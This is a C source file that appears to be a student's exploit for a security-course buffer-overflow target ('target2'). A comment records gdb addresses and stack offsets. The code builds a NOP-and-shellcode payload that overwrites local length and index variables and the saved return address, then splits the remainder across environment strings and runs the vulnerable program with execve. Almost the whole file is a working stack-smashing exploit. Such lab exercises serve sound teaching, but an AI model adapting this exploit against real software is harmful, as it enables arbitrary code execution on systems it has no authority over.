#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

/*
(gdb) p &buf
 	$1 = (char (*)[256]) 0x3021fd80
(gdb)  p &len
	$2 = (int *) 0x3021fe88
(gdb) p &i
	$3 = (int *) 0x3021fe8c
(gdb) info frame
 	Stack level 0, frame at 0x3021fea0:
 	rip = 0x400b85 in foo (target2.c:11); saved rip =  0x400c45
 	called by frame at 0x3021fed0
 	source language c.
 	Arglist at 0x3021fe90, args: arg=0x7fffffffd7b2 "test"
 	Locals at 0x3021fe90, Previous frame's sp is 0x3021fea0
 	Saved registers:
  	rbp at 0x3021fe90, rip at 0x3021fe98

space between buf & rip = 0x3021fe98 - 0x3021fd80 = 280 bytes
space between buf & len = 0x3021fe88 - 0x3021fd80 = 264 bytes
space between buf & i = 0x3021fe8c - 0x3021fd80 = 268 bytes
	
we need to rewrite value of len which is at buf[264]&buf[265]&buf[266]&buf[267] to 284
	then we need to skip i which is at buf[268]~buf[271]
	then we put the buf address in buf[280]~buf[283] to rewrite the return address
	*/

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[4];

	char buf[285]; 

	//fill all the buf with NOP
	for(int i = 0; i < 285; i++){ 
		buf[i] = 0x90;
	}

	//fill buf with shell code
    for (int i = 0; i < 45; i++) {
        buf[i] = shellcode[i];
    }

	// buf address 0x3021fd80;
	buf[280] = 0x80; 
	buf[281] = 0xfd;
	buf[282] = 0x21;
	buf[283] = 0x30;

	//rewrite len to 284
	buf[264] = '\x1b';
	buf[265] = '\x01';
	buf[266] = '\x00';
	buf[267] = '\x00';

	//rewrite i to 271 = 0x010f
	buf[268] = '\x0f';
	buf[269] = '\x01';
	buf[270] = '\x00';
	buf[271] = '\x00';
	
	//copy the rest of the buf after each \x00
	env[0] = "";
	env[1] = &buf[268];
	env[2] = "";
	env[3] = &buf[272];

	args[0] = TARGET;
	args[1] = buf; /*put shellcode and return value here */
	args[2] = NULL;


	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
